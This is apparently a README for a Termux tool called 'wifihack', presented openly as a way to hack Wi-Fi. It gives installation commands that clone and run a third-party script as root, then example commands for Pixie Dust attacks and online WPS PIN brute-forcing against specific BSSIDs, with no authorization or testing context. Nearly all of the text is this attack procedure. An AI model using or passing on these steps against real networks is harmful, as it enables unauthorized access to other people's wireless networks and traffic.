## wifihack

### Hack WIfi Using Termux! (Root Requires )

### Installation :

```bash
$ apt update && apt upgrade
$ pkg install -y root-repo
$ pkg install -y git tsu python wpa-supplicant pixiewps iw
$ git clone https://github.com/engpinxt/wifihack
$ cd wifihack
$ chmod +x wifihack.py
$ sudo python wifihack.py --help
```

#### Example : `sudo python wifihack.py -i wlan0 -K`

#### Note: 
**First turn off your Wifi.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python wifihack.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python wifihack.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python wifihack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**
